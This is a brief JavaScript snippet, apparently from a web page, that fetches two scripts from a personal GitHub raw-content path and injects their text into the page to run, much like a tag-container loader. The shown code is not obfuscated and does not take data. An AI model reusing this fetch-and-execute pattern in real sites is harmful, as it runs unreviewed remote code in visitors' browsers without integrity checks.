
    const containerList = ["496ce8f65af94180b1b148723ff3e9c5","9bd6fedbe99c49de997435c7756ce58c"];
    var d = document,
    s = d.getElementsByTagName('script')[0];
    containerList.forEach(container => {
      fetch(`https://raw.githubusercontent.com/sachin-sinha/cdn/master/6000165802547722822/1ded9eec220a4f8295cd9d8a37de68ea/${container}.js`)
      .then(response => response.text())
      .then(scriptText => {
        const script = document.createElement('script');
        script.type = 'text/javascript';
        script.async = true;
        script.text = scriptText;
        s.parentNode.insertBefore(script, s);
      });
    })
  